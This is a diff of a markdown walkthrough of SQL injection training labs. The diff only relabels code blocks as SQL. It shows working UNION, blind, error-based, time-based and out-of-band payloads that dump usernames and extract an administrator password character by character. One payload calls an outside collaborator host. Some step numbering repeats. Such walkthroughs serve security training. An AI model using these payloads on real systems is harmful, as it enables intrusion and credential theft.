@@ -81,7 +81,7 @@ Capturing the request on burpsuite,
 First thing to do is to confirm the number of columns available in the database
 
 So, we'll be using the query
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -105,7 +105,7 @@ From the above screenshot you'll see that the query ```' order by 3--``` returne
 So, we have 2 columns available in the database.
 
 To query the database version we can use the following query 
-```
+```sql
 ' UNION SELECT banner,null FROM v$version--
 ```
 Explaining this
@@ -142,7 +142,7 @@ Capturing this request on burpsuite and sending it over to burp intruder
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8492bbd-7d49-4822-acc0-9fb99834b8e1)
 
 Now, lets check the number of columns available in the database using the query
-```
+```sql
 ' order by 1-- -
 ' order by 2-- -
 ' order by 3-- -
@@ -166,7 +166,7 @@ Moving on,
 From the above screenshot you'll see that the query ```' order by 3-- -``` returned an Internal Server Error, which means there isn't a column 3 available in the database.
 
 Now, to display the database version string, we can use  the query
-```
+```sql
 ' UNION SELECT version(),null-- -
 ```
 Using this query
@@ -199,7 +199,7 @@ Capturing the request on burpsuite and sending it over to burp repeater
 First, lets check the number of columns available in this database.
 
 We can do that using the queries
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -225,14 +225,14 @@ We got an Internal Server Error here, this means there isn't a column 3 availabl
 Hence, we have 2 columns available in the database.
 
 Lets try to get the version the database is running, we can use the query
-```
+```sql
 ' UNION SELECT version(),null--
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2c24f3-0b28-422e-bfde-a78afceacc68)
 
 Now, lets check the name of the tables in the database. We can use the query
-```
+```sql
 ' UNION SELECT table_name,null FROM information_schema.tables--
 ```
 Applying this query
@@ -242,7 +242,7 @@ Applying this query
 We found a table ```users_vqdnay```.
 
 Next thing to do is to check the name of the columns in the table, we can use the query
-```
+```sql
 ' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_vqdnay'--
 ```
 Applying this query
@@ -252,7 +252,7 @@ Applying this query
 We got the columns ```username_dgcaur``` and ```password_eygubt```.
 
 Cool, lets dump the contents of the columns using the query
-```
+```sql
 ' UNION SELECT username_dgcaur,password_eygubt FROM users_vqdnay--
 ```
 Applying this query
@@ -288,7 +288,7 @@ Capturing this request on burpsuite and sending it over to burp repeater,
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbba3330-c8f3-435b-acaa-b11ccc594079)
 
 Lets start out by checking the amount of columns available in the database. We can use the queries
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -312,7 +312,7 @@ Moving on,
 The "Internal Server Error" means that there isn't a third column available in the database.
 
 Lets check the version the database is running using the query
-```
+```sql
 ' UNION SELECT banner,null FROM v$version--
 ```
 Applying this query
@@ -322,7 +322,7 @@ Applying this query
 Cool, we were able to get the version the database is running.
 
 To get the name of the tables in the database, we can use the query
-```
+```sql
 ' UNION SELECT table_name,null FROM all_tables--
 ```
 Applying this query
@@ -332,7 +332,7 @@ Applying this query
 We found the table name ```USERS_DHHSSL```
 
 The next thing to do is check the name of columns available in the table. We can do that using the query
-```
+```sql
 ' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_DHHSSL'--
 ```
 Applying this query
@@ -342,7 +342,7 @@ Applying this query
 We got the column names ```USERNAME_ZTMDCJ``` and ```PASSWORD_QGFLBW```.
 
 Now, lets go ahead and dump the contents of the columns using the query
-```
+```sql
 ' UNION SELECT USERNAME_ZTMDCJ,PASSWORD_QGFLBW FROM USERS_DHHSSL--
 ```
 Applying this query
@@ -378,7 +378,7 @@ Capturing this request on burpsuite and sending it over to burp repeater,
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5eb74c8c-1139-4f59-9d5b-aa828507f3c6)
 
 We can use ```UNION``` attack to determine the number of column available. We can use the query
-```
+```sql
 ' UNION SELECT null--
 ' UNION SELECT null,null--
 ' UNION SELECT null,null,null--
@@ -428,7 +428,7 @@ Capturing this request on burpsuite and sending it over to burp repeater
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6638917-3208-402e-8147-ac6384411c1f)
 
 First, lets determine the number of columns that's available in the database using the query
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -465,7 +465,7 @@ Hence, we have 3 columns available in the database.
 So, the task is to check which of the columns is compatible with string data. So, we are asked to return the string ```yuJfMW```.
 
 Now, lets start by using the ```UNION``` method to confirm the number of columns. We can use the query
-```
+```sql
 ' UNION SELECT null,null,null--
 ```
 If we don't get the "Internal Server Error" it means there truly are 3 columns available in the database. 
@@ -475,7 +475,7 @@ Applying the query
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/201c39b0-c764-4f39-9aa2-86627659a7c7)
 
 cool, now lets look for the vulnerable column that is compatible with string data. We can try the following queries
-```
+```sql
 ' UNION SELECT 'yuJfMW',null,null--
 ' UNION SELECT null,'yuJfMW',null--
 ' UNION SELECT null,null,'yuJfMW'--
@@ -515,7 +515,7 @@ Capturing this request on burpsuite and sending it over to burp repeater,
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1764eb5-41c3-4f7f-aa2a-4b1676306efb)
 
 Now, this should be an easy one since they already gave us the name of the table to be ```users```, also in the table there are columns ```username``` and ```password```. So, what we'll try to do is just determine the number of columns available in the database. We'll be using the query
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -541,7 +541,7 @@ The "Internal Server Error" displayed is to tell us that there isn't a third col
 So, we have 2 columns available in this database
 
 Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
-```
+```sql
 ' UNION SELECT username,password FROM users--
 ```
 Applying this query
@@ -577,7 +577,7 @@ Capturing the request on burpsuite and sending it over to burp repeater,
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdce4358-ea13-417d-bc4a-c2208ff03ed0)
 
 Lets go ahead and check the number of columns available in the database, we can use the queries
-```
+```sql
 ' order by 1--
 ' order by 2--
 ' order by 3--
@@ -591,7 +591,7 @@ Using these queries
 From the above screenshot, it is obvious that we have just 2 columns available in the database.
 
 Lets go ahead and look for the vulnerable column, that is, the column that is compatible with string data. To do that we can use the query
-```
+```sql
 ' UNION SELECT 'abeg',null--
 ' UNION SELECT null,'abeg'--
 ```
@@ -604,7 +604,7 @@ It is evident that the second column is actually compatible with string data.
 
 Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
 
-```
+```sql
 ' UNION SELECT null,username || '~' || password FROM users--
 ```
 Applying the query
@@ -642,7 +642,7 @@ Click "View details" then capture the request on burpsuite
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e0791be6-76f1-4b3d-a046-964ef73eac0d)
 
 Now, lets use conditional responses to check if it is vulnerable to blind SQLi. We can use the queries
-```
+```sql
 ' AND '1'='1
 ' AND '1'='2
 ```
@@ -665,145 +665,145 @@ Now, that we have confirmed that it is vulnerable, lets go ahead to obtain the p
 Based on the hint we were provided, I think we now know what to focus on
 
 To achieve this, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's
 ```
 Alright so, we'll be trying the letters all the way from ```a-z```, we'll also try the numbers ```0-9```, until we get a "Welcome back!" message
 
 Trying this query you should get the first character of the password
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p
 ```
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbe640e7-9de5-4c93-b602-5153d527ee1c)
 
 Cool, now that we got the first character, lets go ahead and query for the second character, We can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf2a6326-efe4-44a3-baeb-b409234a4bb4)
 
 Getting the 3rd character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'l
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a431dd64-b56d-4110-b33d-d78dac3d22de)
 
 Getting the 4th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 4, 1) = '8
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24c57afa-5628-4c52-9683-b4a5a44c8ea5)
 
 Getting the 5th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 5, 1) = 'z
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58770009-2009-4ad7-838c-d6cdc6994fc4)
 
 Getting the 6th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 6, 1) = 's
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a08b330c-8929-4189-9f1c-b58b05959e06)
 
 Getting the 7th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 7, 1) = 'm
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d55d2e0-1f44-4bf5-a015-61f9624e9bc4)
 
 Getting the 7th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc6e9cfb-a1db-473d-ae1c-42a8d40f856a)
 
 Getting the 8th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41f1714a-cfcc-4c96-bf35-c6f5d458405e)
 
 Getting the 9th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 9, 1) = 'x
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8aa8b3b9-4588-46ec-80ef-0c010168d0b1)
 
 Getting the 10th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 10, 1) = 'r
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62ed9426-e9b8-403c-8b30-cbb75c92a49a)
 
 Getting the 11th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 11, 1) = '7
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3015b5af-90f7-481d-92d1-b515cb8cdf66)
 
 Getting the 12th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 12, 1) = 'b
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f2882032-2e5a-4e5d-b193-ff13edae63ed)
 
 Getting the 13th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 13, 1) = 'i
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/347270ba-c25e-432b-8e97-bff5ca068e0b)
 
 Getting the 14th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 14, 1) = 'i
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9d92107-ce88-4444-be44-191d5e9b72ba)
 
 Getting the 15th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 15, 1) = 'y
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e906e12-547c-4127-b9c5-fbbaac43cfee)
 
 Getting the 16th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 16, 1) = 'l
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f591a1c0-a458-4e9b-8b66-88bb421c95a3)
 
 Getting the 17th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 17, 1) = 'u
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f78d1c3-c72d-4f15-959b-86a35ff49521)
 
 Getting the 18th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 18, 1) = 'q
 ```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31af27ef-2ed1-43ea-b03a-43a11e29f44e)
 
 Getting the 19th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 19, 1) = 't
 ```
 
@@ -811,7 +811,7 @@ Getting the 19th character, we can use the query
 
 
 Getting the 20th character, we can use the query
-```
+```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 20, 1) = 'j
 ```
 
@@ -848,7 +848,7 @@ Now, lets start by testing conditions.
 From the hint provided we can see that this lab uses the oracle dabase
 
 So, using this query we should be able to test the conditions
-```
+```sql
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 ```
@@ -865,7 +865,7 @@ Trying the second query
 This query didn't throw an error because the condition ```1=2``` is not true
 
 Now, to check if there really exists a user ```administrator```, we can use the query
-```
+```sql
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 If this returns an error it means the user exists in the database
@@ -875,7 +875,7 @@ If this returns an error it means the user exists in the database
 Cool, the user is available in the database.
 
 Lets go ahead and check the length of the password available in the database, we can use the query
-```
+```sql
 '||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 So, we are going to keep changing the number ```1``` until we stop getting an error
@@ -891,7 +891,7 @@ Trying this manually;
 From the above screenshot, we can easily tell the the length of the password is ```20```.
 
 Now, lets go ahead and extract the password. We can use this query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 
@@ -926,7 +926,7 @@ Click on "start attack"
 We got our first character
 
 Getting the 2nd character we can use the query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 Using burp intruder
@@ -940,7 +940,7 @@ starting the attack
 We got the 2nd character
 
 Getting the 3rd character, we can use the query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 Using burp inruder
@@ -954,7 +954,7 @@ Starting the attack
 We got the 3rd character
 
 Getting the 4th character, we can use the query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,4,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 Using burp intruder
@@ -968,7 +968,7 @@ Starting the attack
 We got the 4th character
 
 Getting the 5th character, we can use the query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,5,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 Using burp intruder
@@ -982,7 +982,7 @@ Starting the attack
 We got the 5th character
 
 We can continue this process, until we get to the 20th character(since we already know the password length to be 20). We can use the query
-```
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
 ```
 Using burp intruder
@@ -1030,7 +1030,7 @@ You can see we got the error "Unterminated string lateral", if you also observed
 cool, you can see we didn't get an error, so this means we've got the right query.
 
 Now, lets try to use the ```CAST()``` function
-```
+```sql
 ' AND CAST((SELECT 1) AS int)--
 ```
 Ensure this is url encoded
@@ -1038,7 +1038,7 @@ Ensure this is url encoded
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea53d2ea-d3ca-489e-9b44-da66f0b73970)
 
 From the error we have to make the argument ```AND``` boolean. We can solve that using this query
-```
+```sql
 ' AND 1=CAST((SELECT 1) AS int)--
 ```
 Applying this query
@@ -1050,7 +1050,7 @@ you can see we didn't get any error
 Since we were told that there is a table called ```users``` with columns ```username``` and ```password```. Also, there is a username ```administrator```
 
 We can use this query to check for users
-```
+```sql
 ' AND 1=CAST((SELECT username FROM users) AS int)--
 ```
 
@@ -1061,7 +1061,7 @@ We get another error, so there seems to be a character limit here. To get this s
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58d0b5c4-0203-4f4d-b9f9-8932fb3778d4)
 
 We get another error telling us that our query returned more than one row. Modifying the query to return just one row, we can use the query
-```
+```sql
 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 ```
 Using this query
@@ -1071,7 +1071,7 @@ Using this query
 cool, we got the first username in the ```users``` table to be administrator. Lets go ahead and leak the password hehe
 
 This  query will help us with that
-```
+```sql
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
@@ -1104,7 +1104,7 @@ Capturing the request and sending it over to burp repeater
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f09aa96-f85e-45d8-be1d-181b05236393)
 
 To trigger a 10 seconds delay, we can use the query
-```
+```sql
 '|| pg_sleep(10)--
 ```
 Ensure the query is url encoded
@@ -1132,7 +1132,7 @@ Captutring this request and sending it over to burp repeater
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/faf3126c-369d-46fc-953d-93b3c52295f9)
 
 Lets start by triggering a 10s delay
-```
+```sql
 '|| pg_sleep(10)--
 ```
 
@@ -1143,7 +1143,7 @@ Alright, cool we were able to trigger a 10 seconds delay
 We know the table name to be ```users```, the column names are ```username``` and ```password```, then the name of the user is ```administrator```
 
 But lets try to confirm if there really is a username ```administrator```, we can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 Ensure the query is url encoded
@@ -1151,7 +1151,7 @@ Ensure the query is url encoded
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6625acec-7d8b-4179-b35c-11701302d474)
 
 Now that we've confirmed that the username is present in the database. Lets check the length of the password. We can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
@@ -1164,7 +1164,7 @@ This confirmed that the password is greater than 1
 This screenshot confirmed that the length of the passowrd to be 20
 
 Now that we know the length of the password lets start extracting the characters one by one. We'll be inviting burp intruder to the party. We can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 Lets assume the password characters to be lowercase alphanumeric characters.
@@ -1182,7 +1182,7 @@ Trying the other characters,
 I got the first character of the password to be ```7```
 
 To get the second character, we can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
@@ -1191,7 +1191,7 @@ To get the second character, we can use the query
 I got the second character of the password to be ```v```
 
 To get the third character of the password, you can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,3,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
@@ -1202,7 +1202,7 @@ I got the third character of the password to be ```3```.
 This process can be continued until we get to the 20th password character
 
 To get the 20th character, you can use the query
-```
+```sql
 ';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,20,1)='h') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
@@ -1235,7 +1235,7 @@ Capturing the request on burpsuite and sending it over to burp repeater
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fb8fd3f-418a-4a30-b9c6-b3f8bcd55b62)
 
 To trigger out-of-band interaction with burp collaborator, we can use the query
-```
+```sql
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
 ```
 To get the payload from burp collaborator client
@@ -1243,7 +1243,7 @@ To get the payload from burp collaborator client
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4554ade9-c4a0-4794-a789-fd0aad82fab7)
 
 Now, lets paste this query using the payload we got from burp collaborator client
-```
+```sql
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8cllzq3qnv0bxuz5k1o5wgeokfq6ev.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ```
 Ensure the query is url encoded
